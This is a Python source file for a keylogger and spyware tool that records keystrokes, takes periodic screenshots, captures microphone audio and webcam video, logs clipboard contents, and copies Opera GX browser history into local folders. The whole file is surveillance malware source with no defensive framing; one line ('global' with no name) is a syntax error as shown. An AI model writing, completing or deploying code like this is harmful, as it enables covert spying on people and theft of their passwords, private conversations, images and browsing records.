import os
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
import time
import sounddevice as sd
from scipy.io.wavfile import write
import cv2
import pyperclip
import threading
import sqlite3

keys = []
is_logging = True

def on_press(key):
    global
    keys.append(key)
    print("{0} pressed".format(key))
    write_file(key)

def write_file(key):
    with open("C:\\Users\\malek\\OneDrive\\Bureau\\KEYLOGGER\\logs.txt", "a") as f:
        k = str(key).replace("'", "")
        if k == 'Key.space':
            f.write("\n")
        elif k.find("Key") == -1:
            f.write(k)

def take_screenshot():
    while is_logging:
        try:
            save_path = "C:\\Users\\malek\\OneDrive\\Bureau\\KEYLOGGER\\SCREENS"
            screenshot = ImageGrab.grab()
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            screenshot.save(os.path.join(save_path, f"screenshot_{timestamp}.png"))
            print("Screenshot taken successfully.")
        except Exception as e:
            print(f"Error taking screenshot: {e}")
        time.sleep(5)

def record_audio(duration=10, fs=44100):
    while is_logging:
        try:
            audio_path = "C:\\Users\\malek\\OneDrive\\Bureau\\KEYLOGGER\\AUDIO"
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            write(os.path.join(audio_path, f"audio_{timestamp}.wav"), fs, recording)
            print("Audio recorded successfully.")
        except Exception as e:
            print(f"Error recording audio: {e}")
        time.sleep(10)

def record_video(interval=30, fps=30.0):
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    while is_logging:
        try:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            output_path = os.path.join("C:\\Users\\malek\\OneDrive\\Bureau\\KEYLOGGER\\VIDS", f"video_{timestamp}.avi")
            out = cv2.VideoWriter(output_path, fourcc, fps, (640, 480))

            recording_start = time.time()
            while time.time() - recording_start < interval:
                ret, frame = cap.read()
                if ret:
                    out.write(frame)
                else:
                    break
            out.release()
            print(f"Video recorded successfully: {output_path}")
        except Exception as e:
            print(f"Error recording video: {e}")
        time.sleep(10)
    cap.release()
    print("Video recording loop ended.")

def clipboard_monitor():
    last_clipboard_value = ""
    clipboard_file_path = "C:\\Users\\malek\\OneDrive\\Bureau\\KEYLOGGER\\clipboard.txt"
    while is_logging:
        clipboard_value = pyperclip.paste()
        if clipboard_value != last_clipboard_value:
            last_clipboard_value = clipboard_value
            with open(clipboard_file_path, "a") as clipboard_file:
                clipboard_file.write(f"{clipboard_value}\n")
                print("Clipboard content saved to clipboard.txt")
        time.sleep(1)

def fetch_history():
    history_db_path = "C:\\Users\\malek\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\History"
    conn = None
    cursor = None
    while True:
        try:
            conn = sqlite3.connect(history_db_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count FROM urls")
            history_rows = cursor.fetchall()
            conn.close()

            with open("C:\\Users\\malek\\OneDrive\\Bureau\\KEYLOGGER\\history.txt", "a", encoding="utf-8") as history_file:
                for row in history_rows:
                    url = row[0].encode("utf-8", "ignore").decode("utf-8")
                    title = row[1].encode("utf-8", "ignore").decode("utf-8")
                    history_file.write(f"URL: {url} | Title: {title} | Visit Count: {row[2]}\n")
            print("History extracted and saved.")
            break
        except sqlite3.OperationalError as e:
            print(f"Error extracting history data: {e}")
            if conn:
                conn.close()
            time.sleep(10)

def main():
    with open("C:\\Users\\malek\\OneDrive\\Bureau\\KEYLOGGER\\logs.txt", "a"):
        keyboard_listener = Listener(on_press=on_press)
        keyboard_listener.start()
        screenshot_thread = threading.Thread(target=take_screenshot)
        audio_thread = threading.Thread(target=record_audio)
        video_thread = threading.Thread(target=record_video)
        clipboard_thread = threading.Thread(target=clipboard_monitor)
        history_thread = threading.Thread(target=fetch_history)
        screenshot_thread.start()
        audio_thread.start()
        video_thread.start()
        clipboard_thread.start()
        history_thread.start()
        screenshot_thread.join()
        audio_thread.join()
        video_thread.join()
        clipboard_thread.join()
        history_thread.join()

if __name__ == "__main__":
    main()
